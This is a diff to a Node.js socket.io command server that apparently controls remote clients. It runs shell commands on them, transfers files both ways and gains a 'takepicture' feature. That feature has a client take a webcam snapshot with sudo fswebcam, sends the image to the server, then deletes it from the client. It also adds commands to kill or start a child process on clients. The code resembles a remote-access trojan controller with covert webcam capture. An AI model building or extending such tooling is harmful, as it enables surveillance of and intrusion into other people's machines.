@@ -72,7 +72,7 @@ function executeCommand(command){
     else if(words[0] == "exec"){ // Example: exec number "command"
         sendCommand(clientIndex, quotes[1]);
     }
-    else if(words[0] == "shell"){
+    else if(words[0] == "shell"){ // Example: shell ls
         shell.exec(quotes[1]);
     }
     else if (words[0] == "sendfile"){ // Example: sendfile number "C:/tc/example.jpg" "root/users/"
@@ -90,6 +90,15 @@ function executeCommand(command){
         var fileName = temp[temp.length-1];
 
         getFile(clientIndex, localPath, fileName, clientPath);
+    }
+    else if(words[0] == "takepicture"){ // Example: takepicture number.
+    	takePicture(clientIndex);
+    }
+    else if(words[0] == "childkill"){ // Example: childkill number
+    	childKill(clientIndex);
+    }
+    else if(words[0] == "childstart"){ // Example: childstart number
+    	childStart(clientIndex);
     }
     else{
         console.log("Command not found");
@@ -131,15 +140,13 @@ function cls(){
 
 function sendFile(clientIndex, localPath, fileName, clientPath){
 
-
-
     if(clientIndex == "all"){
         var delivery = dl.listen(io.sockets);
         io.sockets.emit('clientWritePath', clientPath);
     }
     else{
         var delivery = dl.listen(clients[clientIndex]);
-        clients[clientIndex].emit('clientWritePath', clientPath)
+        clients[clientIndex].emit('clientWritePath', clientPath);
     }
     
     delivery.connect();
@@ -178,8 +185,48 @@ function getFile(clientIndex, localPath, fileName, clientPath){
             };
         });
     });
-
 }
+
+
+function takePicture(clientIndex){
+
+	sendCommand(clientIndex, "sudo fswebcam -r 640x480 -S 15 --flip h --jpeg 95 --save snapshot.jpg");
+
+	var delivery = dl.listen(clients[clientIndex]);
+
+    clients[clientIndex].emit('getFile', "snapshot.jpg", "./snapshot.jpg");
+
+
+    delivery.on('receive.success',function(file){
+        fs.writeFile("./snapshot.jpg", file.buffer, function(err){
+            if(err){
+                console.log(err);
+            } else{
+                console.log('File saved.');
+                sendCommand(clientIndex, "sudo rm -r snapshot.jpg");
+            };
+        });
+    });
+}
+
+function childKill(clientIndex){
+	if(clientIndex == "all"){
+        io.sockets.emit('childKill');
+    }
+    else{
+        clients[clientIndex].emit('childKill');
+    }
+}
+
+function childStart(clientIndex){
+	if(clientIndex == "all"){
+        io.sockets.emit('childStart');
+    }
+    else{
+        clients[clientIndex].emit('childStart');
+    }
+}
+
 
 cls();
 terminal();
